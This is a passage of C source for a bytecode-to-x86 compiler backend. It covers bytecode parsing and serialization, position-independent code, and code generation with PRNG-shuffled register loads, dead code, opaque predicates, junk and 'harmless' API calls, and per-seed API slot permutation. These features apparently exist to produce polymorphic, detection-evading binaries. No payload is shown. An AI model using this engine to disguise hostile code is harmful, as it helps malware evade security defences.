        bc_read_u16();
        bc_read_u16();
        bc_read_u8();
        field_count = bc_read_u8();
        j = 0;
        while (j < field_count) {
            bc_read_u16();
            bc_read_u8();
            bc_read_u16();
            j = j + 1;
        }
        i = i + 1;
    }

    // Read globals
    mod->globals = malloc((global_count + 1) * MC_SIZEOF_GLOBAL);
    i = 0;
    while (i < global_count) {
        name_idx = bc_read_u16();
        mod->globals[i].name_idx = name_idx;
        mod->globals[i].name = mod->strings[name_idx];
        mod->globals[i].type_code = bc_read_u8();
        mod->globals[i].init_kind = bc_read_u8();
        mod->globals[i].init_value = bc_read_i32();
        if (mod->globals[i].type_code == TC_I8) {
            mod->globals[i].size = 1;
        } else {
            mod->globals[i].size = 4;
        }
        i = i + 1;
    }

    // Read functions
    mod->funcs = malloc(func_count * MC_SIZEOF_FUNCTION);
    i = 0;
    while (i < func_count) {
        f = &mod->funcs[i];

        name_idx = bc_read_u16();
        f->name_idx = name_idx;
        f->name = mod->strings[name_idx];
        f->return_type = bc_read_u8();
        f->param_count = bc_read_u8();
        f->local_count = bc_read_u8();
        f->block_count = bc_read_u16();
        f->temp_count = bc_read_u16();
        f->dll_idx = bc_read_u16();
        if (f->dll_idx > 0 && f->dll_idx < string_count) {
            f->dll_name = mod->strings[f->dll_idx];
        } else {
            f->dll_name = 0;
        }
        // Check for main
        if (str_eq(f->name, "main") != 0) {
            mod->entry_func = i;
        }

        // Read param types
        f->param_types = malloc((f->param_count + 1) * 4);
        j = 0;
        while (j < f->param_count) {
            f->param_types[j] = bc_read_u8();
            j = j + 1;
        }

        // Read local types and sizes
        f->local_types = malloc((f->local_count + 1) * 4);
        f->local_sizes = malloc((f->local_count + 1) * 4);
        j = 0;
        while (j < f->local_count) {
            f->local_types[j] = bc_read_u8();
            f->local_sizes[j] = bc_read_u16();
            j = j + 1;
        }

        // Read blocks
        f->blocks = malloc((f->block_count + 1) * MC_SIZEOF_BLOCK);
        b = 0;
        while (b < f->block_count) {
            blk = &f->blocks[b];
            name_idx = bc_read_u16();
            blk->label = mod->strings[name_idx];
            blk->instr_count = bc_read_u16();
            blk->instrs = malloc((blk->instr_count + 1) * MC_SIZEOF_INSTRUCTION);

            k = 0;
            while (k < blk->instr_count) {
                ins = &blk->instrs[k];
                zero_instr(ins);

                opcode = bc_read_u8();
                ins->opcode = opcode;

                if (opcode == OP_NOP) {
                    // No operands
                } else if (opcode == OP_CONST) {
                    bc_read_operand(&ins->dest);
                    ins->src1.value = bc_read_i32();
                    ins->src1.kind = VK_CONST;
                    ins->type_code = bc_read_u8();
                } else if (opcode == OP_NEG || opcode == OP_NOT || opcode == OP_COPY) {
                    bc_read_operand(&ins->dest);
                    bc_read_operand(&ins->src1);
                    ins->type_code = bc_read_u8();
                } else if (opcode >= OP_ADD && opcode <= OP_GE) {
                    bc_read_operand(&ins->dest);
                    bc_read_operand(&ins->src1);
                    bc_read_operand(&ins->src2);
                    ins->type_code = bc_read_u8();
                } else if (opcode == OP_LOAD) {
                    bc_read_operand(&ins->dest);
                    bc_read_operand(&ins->src1);
                    ins->type_code = bc_read_u8();
                } else if (opcode == OP_STORE) {
                    bc_read_operand(&ins->dest);
                    bc_read_operand(&ins->src1);
                    ins->type_code = bc_read_u8();
                } else if (opcode == OP_ADDR) {
                    bc_read_operand(&ins->dest);
                    loc_kind = bc_read_u8();
                    loc_idx = bc_read_u8();
                    if (loc_kind == 1) {
                        loc_idx = loc_idx | (bc_read_u8() << 8);
                        ins->src1.kind = VK_GLOBAL;
                    } else {
                        ins->src1.kind = VK_LOCAL;
                    }
                    ins->src1.index = loc_idx;
                } else if (opcode == OP_PTRADD) {
                    bc_read_operand(&ins->dest);
                    bc_read_operand(&ins->src1);
                    bc_read_operand(&ins->src2);
                    ins->elem_size = bc_read_u16();
                } else if (opcode == OP_FIELDPTR) {
                    bc_read_operand(&ins->dest);
                    bc_read_operand(&ins->src1);
                    ins->offset = bc_read_u16();
                } else if (opcode == OP_ALLOCA) {
                    bc_read_operand(&ins->dest);
                    ins->offset = bc_read_u16();
                    ins->elem_size = bc_read_u8();
                } else if (opcode == OP_JMP) {
                    ins->target_block = bc_read_u16();
                } else if (opcode == OP_JZ || opcode == OP_JNZ) {
                    bc_read_operand(&ins->src1);
                    ins->target_block = bc_read_u16();
                } else if (opcode == OP_CALL) {
                    bc_read_operand(&ins->dest);
                    ins->func_idx = bc_read_u16();
                    ins->arg_count = bc_read_u8();
                    ins->args = malloc((ins->arg_count + 1) * MC_SIZEOF_OPERAND);
                    a = 0;
                    while (a < ins->arg_count) {
                        bc_read_operand(&ins->args[a]);
                        a = a + 1;
                    }
                } else if (opcode == OP_CALLV) {
                    ins->func_idx = bc_read_u16();
                    ins->arg_count = bc_read_u8();
                    ins->args = malloc((ins->arg_count + 1) * MC_SIZEOF_OPERAND);
                    a = 0;
                    while (a < ins->arg_count) {
                        bc_read_operand(&ins->args[a]);
                        a = a + 1;
                    }
                } else if (opcode == OP_ICALL) {
                    bc_read_operand(&ins->dest);
                    bc_read_operand(&ins->src1);  // target address
                    ins->arg_count = bc_read_u8();
                    ins->args = malloc((ins->arg_count + 1) * MC_SIZEOF_OPERAND);
                    a = 0;
                    while (a < ins->arg_count) {
                        bc_read_operand(&ins->args[a]);
                        a = a + 1;
                    }
                } else if (opcode == OP_ICALLV) {
                    bc_read_operand(&ins->src1);  // target address
                    ins->arg_count = bc_read_u8();
                    ins->args = malloc((ins->arg_count + 1) * MC_SIZEOF_OPERAND);
                    a = 0;
                    while (a < ins->arg_count) {
                        bc_read_operand(&ins->args[a]);
                        a = a + 1;
                    }
                } else if (opcode == OP_FUNC_ADDR) {
                    bc_read_operand(&ins->dest);
                    ins->func_idx = bc_read_u16();
                } else if (opcode == OP_SYSCALL) {
                    int sa;
                    bc_read_operand(&ins->dest);
                    ins->arg_count = 6;
                    ins->args = malloc(7 * MC_SIZEOF_OPERAND);
                    sa = 0;
                    while (sa < 6) {
                        bc_read_operand(&ins->args[sa]);
                        sa = sa + 1;
                    }
                } else if (opcode == OP_RET) {
                    bc_read_operand(&ins->src1);
                } else if (opcode == OP_RETV) {
                    // No operands
                } else if (opcode == OP_EMIT) {
                    int rk;
                    ins->raw_count = bc_read_u8();
                    if (ins->raw_count > 0) {
                        ins->raw_bytes = malloc(ins->raw_count);
                    } else {
                        ins->raw_bytes = 0;
                    }
                    rk = 0;
                    while (rk < ins->raw_count) {
                        ins->raw_bytes[rk] = bc_read_u8();
                        rk = rk + 1;
                    }
                    // OP_EMIT has no dest — mark VK_CONST to avoid compact_temps mishandling
                    ins->dest.kind = VK_CONST;
                }

                k = k + 1;
            }
            b = b + 1;
        }
        i = i + 1;
    }

    // Assign api_slot per function. Externs get sequential slots from 0 in
    // source order (the original MC backend behavior — the loader resolves
    // wrappers by NAME, not slot, so reserving fixed slots for builtins is
    // unnecessary). Code functions get api_slot = their position (unused;
    // api_slot only matters for externs). The per-seed permute_api_slots in
    // compile_main reshuffles these later.
    {
        int extern_slot;
        struct Function* fn;
        extern_slot = 0;
        i = 0;
        while (i < mod->func_count) {
            fn = &mod->funcs[i];
            if (fn->block_count > 0) {
                fn->api_slot = i;
            } else {
                fn->api_slot = extern_slot;
                extern_slot = extern_slot + 1;
            }
            i = i + 1;
        }
    }

    return mod;
}

// =============================================================================
// Bytecode Writer (serialize IR back to .mcb format)
// =============================================================================

int find_string_idx(char* s) {
    int i;
    i = 0;
    while (i < g_mod->string_count) {
        if (g_mod->strings[i] == s) {
            return i;
        }
        i = i + 1;
    }
    return 0;
}

void bc_write_operand(struct Buffer* buf, struct Operand* op) {
    buf_write_u8(buf, op->kind);
    if (op->kind == VK_CONST) {
        buf_write_u32(buf, op->value);
    } else {
        buf_write_u16(buf, op->index);
    }
}

struct Buffer* emit_bytecode_buf() {
    struct Buffer* buf;
    struct Buffer* strbuf;
    int* str_offsets;
    int i;
    int j;
    int b;
    int k;
    int a;
    int slen;
    struct Function* f;
    struct Block* blk;
    struct Instruction* ins;
    int op;

    buf = buf_new(65536);

    // Header
    buf_write_u32(buf, MC_MAGIC);
    buf_write_u16(buf, 1);
    buf_write_u8(buf, 1);
    buf_write_u8(buf, 0);
    buf_write_u16(buf, g_mod->string_count);
    buf_write_u16(buf, 0);
    buf_write_u16(buf, g_mod->global_count);
    buf_write_u16(buf, g_mod->func_count);

    // String table
    str_offsets = malloc(g_mod->string_count * 4);
    strbuf = buf_new(4096);
    i = 0;
    while (i < g_mod->string_count) {
        str_offsets[i] = strbuf->len;
        slen = str_len(g_mod->strings[i]);
        buf_write_bytes(strbuf, g_mod->strings[i], slen);
        buf_write_u8(strbuf, 0);
        i = i + 1;
    }
    buf_write_u32(buf, strbuf->len);
    i = 0;
    while (i < g_mod->string_count) {
        buf_write_u32(buf, str_offsets[i]);
        i = i + 1;
    }
    buf_write_bytes(buf, strbuf->data, strbuf->len);
    free(str_offsets);
    free(strbuf->data);
    free(strbuf);

    // Globals
    i = 0;
    while (i < g_mod->global_count) {
        buf_write_u16(buf, g_mod->globals[i].name_idx);
        buf_write_u8(buf, g_mod->globals[i].type_code);
        buf_write_u8(buf, g_mod->globals[i].init_kind);
        buf_write_u32(buf, g_mod->globals[i].init_value);
        i = i + 1;
    }

    // Functions
    i = 0;
    while (i < g_mod->func_count) {
        f = &g_mod->funcs[i];
        buf_write_u16(buf, f->name_idx);
        buf_write_u8(buf, f->return_type);
        buf_write_u8(buf, f->param_count);
        buf_write_u8(buf, f->local_count);
        buf_write_u16(buf, f->block_count);
        buf_write_u16(buf, f->temp_count);
        buf_write_u16(buf, f->dll_idx);

        j = 0;
        while (j < f->param_count) {
            buf_write_u8(buf, f->param_types[j]);
            j = j + 1;
        }

        j = 0;
        while (j < f->local_count) {
            buf_write_u8(buf, f->local_types[j]);
            buf_write_u16(buf, f->local_sizes[j]);
            j = j + 1;
        }

        b = 0;
        while (b < f->block_count) {
            blk = &f->blocks[b];
            buf_write_u16(buf, find_string_idx(blk->label));
            buf_write_u16(buf, blk->instr_count);

            k = 0;
            while (k < blk->instr_count) {
                ins = &blk->instrs[k];
                op = ins->opcode;
                buf_write_u8(buf, op);

                if (op == OP_NOP) {
                    // no operands
                } else if (op == OP_CONST) {
                    bc_write_operand(buf, &ins->dest);
                    buf_write_u32(buf, ins->src1.value);
                    buf_write_u8(buf, ins->type_code);
                } else if (op == OP_COPY || op == OP_NEG || op == OP_NOT) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u8(buf, ins->type_code);
                } else if (op >= OP_ADD && op <= OP_GE) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    bc_write_operand(buf, &ins->src2);
                    buf_write_u8(buf, ins->type_code);
                } else if (op == OP_LOAD) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u8(buf, ins->type_code);
                } else if (op == OP_STORE) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u8(buf, ins->type_code);
                } else if (op == OP_ADDR) {
                    bc_write_operand(buf, &ins->dest);
                    if (ins->src1.kind == VK_GLOBAL) {
                        buf_write_u8(buf, 1);
                        buf_write_u8(buf, ins->src1.index & 0xFF);
                        buf_write_u8(buf, (ins->src1.index >> 8) & 0xFF);
                    } else {
                        buf_write_u8(buf, 0);
                        buf_write_u8(buf, ins->src1.index & 0xFF);
                    }
                } else if (op == OP_PTRADD) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    bc_write_operand(buf, &ins->src2);
                    buf_write_u16(buf, ins->elem_size);
                } else if (op == OP_FIELDPTR) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u16(buf, ins->offset);
                } else if (op == OP_ALLOCA) {
                    bc_write_operand(buf, &ins->dest);
                    buf_write_u16(buf, ins->offset);
                    buf_write_u8(buf, ins->elem_size);
                } else if (op == OP_JMP) {
                    buf_write_u16(buf, ins->target_block);
                } else if (op == OP_JZ || op == OP_JNZ) {
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u16(buf, ins->target_block);
                } else if (op == OP_CALL) {
                    bc_write_operand(buf, &ins->dest);
                    buf_write_u16(buf, ins->func_idx);
                    buf_write_u8(buf, ins->arg_count);
                    a = 0;
                    while (a < ins->arg_count) {
                        bc_write_operand(buf, &ins->args[a]);
                        a = a + 1;
                    }
                } else if (op == OP_CALLV) {
                    buf_write_u16(buf, ins->func_idx);
                    buf_write_u8(buf, ins->arg_count);
                    a = 0;
                    while (a < ins->arg_count) {
                        bc_write_operand(buf, &ins->args[a]);
                        a = a + 1;
                    }
                } else if (op == OP_RET) {
                    bc_write_operand(buf, &ins->src1);
                } else if (op == OP_RETV) {
                    // no operands
                } else if (op == OP_ICALL) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u8(buf, ins->arg_count);
                    a = 0;
                    while (a < ins->arg_count) {
                        bc_write_operand(buf, &ins->args[a]);
                        a = a + 1;
                    }
                } else if (op == OP_ICALLV) {
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u8(buf, ins->arg_count);
                    a = 0;
                    while (a < ins->arg_count) {
                        bc_write_operand(buf, &ins->args[a]);
                        a = a + 1;
                    }
                } else if (op == OP_FUNC_ADDR) {
                    bc_write_operand(buf, &ins->dest);
                    buf_write_u16(buf, ins->func_idx);
                } else if (op == OP_SYSCALL) {
                    int sa;
                    bc_write_operand(buf, &ins->dest);
                    sa = 0;
                    while (sa < 6) {
                        bc_write_operand(buf, &ins->args[sa]);
                        sa = sa + 1;
                    }
                } else if (op == OP_EMIT) {
                    // Format: [count: u8] [raw bytes]
                    // No dest operand (dest.kind was set to VK_CONST internally)
                    buf_write_u8(buf, ins->raw_count);
                    int rk;
                    rk = 0;
                    while (rk < ins->raw_count) {
                        buf_write_u8(buf, ins->raw_bytes[rk]);
                        rk = rk + 1;
                    }
                }

                k = k + 1;
            }
            b = b + 1;
        }
        i = i + 1;
    }

    return buf;
}


// =============================================================================
// Code Generator — Helpers
// =============================================================================

// Emit PIC getbase: CALL $+5; POP reg; SUB reg, (pos+5)
void emit_pic_getbase(int reg) {
    int pos;
    pos = g_code->len;
    emit_call_rel(0);
    emit_pop(reg);
    emit_sub_ri(reg, pos + 5);
}

// Emit PIC LEA via fixup: CALL $+5; POP reg; ADD reg, imm32_placeholder
// Returns base_pos (code->len right after the CALL)
// Caller must add a fixup at (return_value + 2) for the ADD imm32 placeholder
int emit_pic_lea(int reg) {
    int base_pos;
    emit_call_rel(0);
    base_pos = g_code->len;
    emit_pop(reg);
    emit_byte(0x81);
    emit_byte(0xC0 + reg);
    return base_pos;
}

// Shared helper for OP_DIV and OP_MOD
void gen_divmod(struct Instruction* ins, int use_edx) {
    int r2;
    int safe;
    int t_tmp;
    int eax_occ;
    int off_tmp;
    int result_reg;

    r2 = ra_load_src(&ins->src2);
    if (ins->src1.kind == VK_TEMP) {
        ra_force(ins->src1.index, REG_EAX);
    } else {
        ra_free_reg(REG_EAX);
        load_operand(&ins->src1, REG_EAX);
        g_ra_alloc[REG_EAX] = -2;
    }
    // Re-read r2
    if (ins->src2.kind == VK_TEMP) {
        r2 = g_ra_temp_reg[ins->src2.index];
        if (r2 < 0) { r2 = ra_ensure_ex(ins->src2.index, REG_EAX); }
    } else if (r2 == REG_EAX || g_ra_alloc[r2] != -2) {
        r2 = ra_get_scratch(REG_EAX, REG_EDX, -1);
        load_operand(&ins->src2, r2);
    }
    if (g_ra_alloc[REG_EDX] >= 0) { ra_spill_reg(REG_EDX); }
    g_ra_alloc[REG_EDX] = -2;
    if (r2 == REG_EAX || r2 == REG_EDX) {
        safe = ra_get_scratch(REG_EAX, REG_EDX, -1);
        emit_mov_rr(safe, r2);
        if (g_ra_alloc[r2] >= 0) {
            t_tmp = g_ra_alloc[r2];
            g_ra_temp_reg[t_tmp] = safe;
            g_ra_alloc[safe] = t_tmp;
            g_ra_alloc[r2] = -2;
        }
        r2 = safe;
    }
    eax_occ = g_ra_alloc[REG_EAX];
    if (use_edx != 0) {
        // MOD: always spill EAX occupant
        if (eax_occ >= 0) {
            if (g_ra_dirty[eax_occ] != 0) {
                off_tmp = 0 - (4 + eax_occ * 4);
                emit_mov_mr_disp(REG_EBP, off_tmp, REG_EAX);
                g_ra_dirty[eax_occ] = 0;
            }
            g_ra_temp_reg[eax_occ] = -1;
        }
        g_ra_alloc[REG_EAX] = -2;
    } else {
        // DIV: only spill if different from dest
        if (eax_occ >= 0 && eax_occ != ins->dest.index) {
            if (g_ra_dirty[eax_occ] != 0) {
                off_tmp = 0 - (4 + eax_occ * 4);
                emit_mov_mr_disp(REG_EBP, off_tmp, REG_EAX);
                g_ra_dirty[eax_occ] = 0;
            }
            g_ra_temp_reg[eax_occ] = -1;
        }
    }
    emit_cdq();
    emit_idiv(r2);
    if (use_edx != 0) { result_reg = REG_EDX; }
    else { result_reg = REG_EAX; }
    g_ra_alloc[result_reg] = -2;
    if (ins->dest.kind == VK_TEMP) {
        g_ra_alloc[result_reg] = ins->dest.index;
        g_ra_temp_reg[ins->dest.index] = result_reg;
        g_ra_dirty[ins->dest.index] = 1;
    }
}

// Shared helper for OP_SHL and OP_SHR
void gen_shift(struct Instruction* ins, int is_right) {
    int r1;
    int rd;
    int alt;
    int t_tmp;

    r1 = ra_load_src(&ins->src1);
    if (ins->src2.kind == VK_TEMP) {
        ra_force(ins->src2.index, REG_ECX);
    } else {
        ra_free_reg(REG_ECX);
        load_operand(&ins->src2, REG_ECX);
        g_ra_alloc[REG_ECX] = -2;
    }
    // Re-read r1
    if (ins->src1.kind == VK_TEMP) {
        r1 = g_ra_temp_reg[ins->src1.index];
        if (r1 < 0) { r1 = ra_ensure_ex(ins->src1.index, REG_ECX); }
    } else if (r1 == REG_ECX || g_ra_alloc[r1] != -2) {
        r1 = ra_get_scratch(REG_ECX, -1, -1);
        load_operand(&ins->src1, r1);
    }
    if (r1 == REG_ECX) {
        alt = ra_get_scratch(REG_ECX, -1, -1);
        emit_mov_rr(alt, r1);
        if (g_ra_alloc[r1] >= 0) {
            t_tmp = g_ra_alloc[r1];
            g_ra_temp_reg[t_tmp] = alt;
            g_ra_alloc[alt] = t_tmp;
            g_ra_alloc[r1] = -2;
        }
        r1 = alt;
    }
    rd = ra_def(ins->dest.index, r1, REG_ECX);
    if (rd == REG_ECX) {
        alt = ra_get_scratch(REG_ECX, r1, -1);
        g_ra_alloc[REG_ECX] = -2;
        g_ra_alloc[alt] = ins->dest.index;
        g_ra_temp_reg[ins->dest.index] = alt;
        g_ra_dirty[ins->dest.index] = 1;
        rd = alt;
    }
    if (rd != r1) { emit_mov_rr(rd, r1); }
    if (is_right != 0) { emit_shr_cl(rd); }
    else { emit_shl_cl(rd); }
}

// Shared helper for OP_CALL and OP_CALLV
// Linux INT 0x80 syscall: EAX=num, EBX/ECX/EDX/ESI/EDI=a1..a5, return in EAX.
// Loads are emitted in a PRNG-shuffled order across the 6 slots for polymorphism.
void gen_syscall_common(struct Instruction* ins) {
    int* order;
    int i;
    int j;
    int t;
    int k;
    int slot;
    int reg;
    int r;
    struct Operand* op;

    ra_spill_all();

    order = malloc(6 * 4);
    order[0] = 0;
    order[1] = 1;
    order[2] = 2;
    order[3] = 3;
    order[4] = 4;
    order[5] = 5;

    i = 5;
    while (i > 0) {
        j = prng_range(i + 1);
        t = order[i];
        order[i] = order[j];
        order[j] = t;
        i = i - 1;
    }

    k = 0;
    while (k < 6) {
        slot = order[k];
        if (slot == 0) { reg = REG_EAX; }
        else if (slot == 1) { reg = REG_EBX; }
        else if (slot == 2) { reg = REG_ECX; }
        else if (slot == 3) { reg = REG_EDX; }
        else if (slot == 4) { reg = REG_ESI; }
        else { reg = REG_EDI; }

        op = &ins->args[slot];
        if (g_ra_alloc[reg] >= 0) { ra_spill_reg(reg); }
        g_ra_alloc[reg] = -2;
        if (op->kind == VK_CONST) {
            emit_mov_ri(reg, op->value);
        } else {
            load_operand(op, reg);
        }
        k = k + 1;
    }

    free(order);

    emit_byte(0xCD);
    emit_byte(0x80);

    r = 0;
    while (r < 8) {
        if (g_ra_alloc[r] == -2) { g_ra_alloc[r] = -1; }
        r = r + 1;
    }

    if (ins->dest.kind == VK_TEMP) {
        g_ra_alloc[REG_EAX] = ins->dest.index;
        g_ra_temp_reg[ins->dest.index] = REG_EAX;
        g_ra_dirty[ins->dest.index] = 1;
    }
}

void gen_call_common(struct Instruction* ins, int has_return) {
    struct Function* target_func;
    int is_extern;
    int a;

    ra_spill_all();
    target_func = &g_mod->funcs[ins->func_idx];
    is_extern = 0;
    if (target_func->block_count == 0) { is_extern = 1; }

    if (g_abs_mode == 1 && is_extern != 0) {
        // Abs PE mode: push args, CALL [IAT] (FF 15 disp32)
        a = ins->arg_count - 1;
        while (a >= 0) {
            load_operand(&ins->args[a], REG_EAX);
            emit_push(REG_EAX);
            a = a - 1;
        }
        emit_byte(0xFF); emit_byte(0x15);
        add_abs_extern_fixup(g_code->len, get_api_slot(ins->func_idx));
        emit_u32(0);
    } else if (g_abs_mode == 2 && is_extern != 0) {
        // Abs/scatter ELF mode: push args, CALL rel32
        a = ins->arg_count - 1;
        while (a >= 0) {
            load_operand(&ins->args[a], REG_EAX);
            emit_push(REG_EAX);
            a = a - 1;
        }
        emit_byte(0xE8);
        add_abs_extern_fixup(g_code->len, get_api_slot(ins->func_idx));
        emit_u32(0);
        if (ins->arg_count > 0) {
            emit_add_ri(REG_ESP, ins->arg_count * 4);
        }
    } else if (g_pic_mode != 0 && is_extern != 0) {
        emit_pic_getbase(REG_EBX);
        emit_mov_rm_disp(REG_EAX, REG_EBX, g_api_slot_offset);
        emit_mov_rm_disp(REG_EAX, REG_EAX, get_api_slot(ins->func_idx) * 4);
        emit_push(REG_EAX);
        a = ins->arg_count - 1;
        while (a >= 0) {
            load_operand(&ins->args[a], REG_ECX);
            emit_push(REG_ECX);
            a = a - 1;
        }
        emit_mov_rm_disp(REG_EAX, REG_ESP, ins->arg_count * 4);
        emit_byte(0xFF); emit_byte(0xD0);
        if (g_cdecl_externs != 0) {
            emit_add_ri(REG_ESP, (ins->arg_count + 1) * 4);
        } else {
            emit_add_ri(REG_ESP, 4);
        }
    } else {
        a = ins->arg_count - 1;
        while (a >= 0) {
            load_operand(&ins->args[a], REG_EAX);
            emit_push(REG_EAX);
            a = a - 1;
        }
        emit_byte(0xE8);
        add_call_fixup(g_code->len, ins->func_idx);
        emit_u32(0);
        if (ins->arg_count > 0) {
            emit_add_ri(REG_ESP, ins->arg_count * 4);
        }
    }
    if (has_return != 0 && ins->dest.kind == VK_TEMP) {
        g_ra_alloc[REG_EAX] = ins->dest.index;
        g_ra_temp_reg[ins->dest.index] = REG_EAX;
        g_ra_dirty[ins->dest.index] = 1;
    }
}

// Shared helper for OP_ICALL and OP_ICALLV (indirect call through variable)
void gen_icall_common(struct Instruction* ins, int has_return) {
    int a;
    ra_spill_all();
    // Push args in reverse order
    a = ins->arg_count - 1;
    while (a >= 0) {
        load_operand(&ins->args[a], REG_EAX);
        emit_push(REG_EAX);
        a = a - 1;
    }
    // Load target address into EAX
    load_operand(&ins->src1, REG_EAX);
    // CALL EAX (FF D0)
    emit_byte(0xFF); emit_byte(0xD0);
    // cdecl: caller cleans stack
    if (ins->arg_count > 0) {
        emit_add_ri(REG_ESP, ins->arg_count * 4);
    }
    if (has_return != 0 && ins->dest.kind == VK_TEMP) {
        g_ra_alloc[REG_EAX] = ins->dest.index;
        g_ra_temp_reg[ins->dest.index] = REG_EAX;
        g_ra_dirty[ins->dest.index] = 1;
    }
}

// =============================================================================
// Code Generator
// =============================================================================

void gen_function(int func_idx) {
    struct Function* func;
    struct Block* blk;
    struct Instruction* ins;
    int frame_size;
    int li;
    int sz;
    int current_pos;
    int b;
    int i;
    int offset;
    int base_pos;
    int fixup_pos;
    int target;
    int rel;
    int f;
    int patch_pos;
    int target_block;
    int instr_size;
    int instruction_end;
    int size;
    int opcode;
    int prev_last_op;
    int block_returned;
    // RA variables
    int r1; int r2; int rd; int rv; int rp; int scr; int scr2;
    int alt; int safe; int addr_reg; int cmp_cc;
    int need_byte; int eax_occ; int occ; int t_tmp; int off_tmp;
    int _before; int _b;
    int _save_eax; int _save_ecx; int _save_edx;
    int _has_free; int _ri;

    func = &g_mod->funcs[func_idx];
    g_current_func = func;

    // Initialize register allocator for this function
    ra_init_func(func_idx);

    // Calculate stack frame size
    frame_size = func->temp_count * 4;
    li = 0;
    while (li < func->local_count) {
        sz = func->local_sizes[li];
        if (sz < 4) {
            sz = 4;
        }
        frame_size = frame_size + sz;
        li = li + 1;
    }
    frame_size = (frame_size + 15) & (0 - 16);

    // Prologue (polymorphic SUB/ADD ESP)
    emit_push(REG_EBP);
    emit_mov_rr(REG_EBP, REG_ESP);
    if (frame_size > 0) {
        if (g_x86_poly_instrs != 0 && prng_range(2) != 0) {
            emit_add_ri(REG_ESP, 0 - frame_size);
        } else {
            emit_sub_ri(REG_ESP, frame_size);
        }
    }
    emit_push(REG_EBX);
    emit_push(REG_ESI);
    emit_push(REG_EDI);
    if (g_x86_dead_code != 0) { maybe_insert_dead(g_genome[GI_DEAD_PROLOGUE_PCT]); }

    // PIC entry function: store API table pointer (skip in scatter mode — no API table)
    if (g_pic_mode != 0 && g_abs_mode == 0 && func_idx == g_entry_func_idx) {
        emit_pic_getbase(REG_EBX);
        emit_mov_rm_disp(REG_EAX, REG_EBP, 8);
        emit_mov_mr_disp(REG_EBX, g_api_slot_offset, REG_EAX);
    }

    // Allocate block offsets and reset fixups
    g_block_offsets = malloc(func->block_count * 4);
    g_fixup_count = 0;

    // Generate blocks
    b = 0;
    while (b < func->block_count) {
        if (b > 0) {
            // Block-boundary junk — skip after blocks ending with RET/RETV (unreachable)
            prev_last_op = -1;
            if (func->blocks[b - 1].instr_count > 0) {
                prev_last_op = func->blocks[b - 1].instrs[func->blocks[b - 1].instr_count - 1].opcode;
            }
            if (prev_last_op != OP_RET && prev_last_op != OP_RETV) {
                if (g_x86_dead_code != 0) { maybe_insert_dead(g_genome[GI_DEAD_BLOCK_PCT]); }
                if (g_x86_opaque != 0) { maybe_insert_opaque(REG_EDX, REG_ESI, g_genome[GI_OPAQUE_PCT]); }
                maybe_emit_junk_call(g_genome[GI_JUNK_CALL_BLOCK_PCT]);
                maybe_emit_harmless_api_call(g_genome[GI_HARMLESS_BLOCK_PCT]);
            }
        }
        g_block_offsets[b] = g_code->len;
        blk = &func->blocks[b];
        g_ra_cur_block = b;
        ra_begin_block(b);
        block_returned = 0;

        i = 0;
        while (i < blk->instr_count && block_returned == 0) {
            ins = &blk->instrs[i];
            opcode = ins->opcode;
            g_ra_cur_instr = i;

            // Inter-instruction junk (RA-aware: junk only uses free registers)
            {
                if (g_x86_dead_code != 0) {
                    // Only insert dead code if at least one register is free
                    _has_free = 0;
                    _ri = 0;
                    while (_ri < g_ra_num_regs) {
                        if (g_ra_alloc[g_ra_reg_order[_ri]] < 0) {
                            _has_free = 1;
                            _ri = g_ra_num_regs;
                        }
                        _ri = _ri + 1;
                    }
                    if (_has_free != 0) {
                        g_junk_ra_aware = 1;
                        _b = g_code->len;
                        maybe_insert_dead(g_genome[GI_DEAD_INSTR_PCT]);
                        g_junk_ra_aware = 0;
                    }
                }
                if (g_x86_junk_funcs != 0) {
                    _b = g_code->len;
                    _save_eax = 0;
                    _save_ecx = 0;
                    _save_edx = 0;
                    if (g_ra_alloc[REG_EAX] >= 0) { emit_push(REG_EAX); _save_eax = 1; }
                    if (g_ra_alloc[REG_ECX] >= 0) { emit_push(REG_ECX); _save_ecx = 1; }
                    if (g_ra_alloc[REG_EDX] >= 0) { emit_push(REG_EDX); _save_edx = 1; }
                    _before = g_code->len;
                    maybe_emit_junk_call(g_genome[GI_JUNK_CALL_INSTR_PCT]);
                    if (g_code->len > _before) {
                        if (_save_edx != 0) { emit_pop(REG_EDX); }
                        if (_save_ecx != 0) { emit_pop(REG_ECX); }
                        if (_save_eax != 0) { emit_pop(REG_EAX); }
                    } else {
                        g_code->len = _b;
                    }
                }
                maybe_emit_harmless_api_call(g_genome[GI_HARMLESS_INSTR_PCT]);
            }

            if (opcode == OP_NOP) {
                emit_byte(0x90);

            } else if (opcode == OP_CONST) {
                rd = ra_def(ins->dest.index, -1, -1);
                if (g_x86_poly_instrs != 0) {
                    emit_movi_poly(rd, ins->src1.value);
                } else {
                    emit_mov_ri(rd, ins->src1.value);
                }

            } else if (opcode == OP_COPY) {
                r1 = ra_load_src(&ins->src1);
                if (ins->dest.kind == VK_TEMP) {
                    rd = ra_def(ins->dest.index, r1, -1);
                    if (rd != r1) { emit_mov_rr(rd, r1); }
                }

            } else if (opcode == OP_ADD) {
                r1 = ra_load_src(&ins->src1);
                r2 = ra_load_src_ex(&ins->src2, r1);
                rd = ra_def_reuse(ins->dest.index, r1, r2);
                if (g_x86_poly_instrs != 0) {
                    scr = ra_get_scratch(rd, r1, r2);
                    if (rd != r1) { emit_mov_rr(rd, r1); }
                    emit_add_poly(rd, rd, r2, scr);
                } else {
                    if (rd == r1) {
                        emit_add_rr(rd, r2);
                    } else if (rd == r2) {
                        emit_add_rr(rd, r1);
                    } else {
                        emit_mov_rr(rd, r1);
                        emit_add_rr(rd, r2);
                    }
                }

            } else if (opcode == OP_SUB) {
                r1 = ra_load_src(&ins->src1);
                r2 = ra_load_src_ex(&ins->src2, r1);
                rd = ra_def_reuse(ins->dest.index, r1, r2);
                if (g_x86_poly_instrs != 0) {
                    scr = ra_get_scratch(rd, r1, r2);
                    if (rd != r1) { emit_mov_rr(rd, r1); }
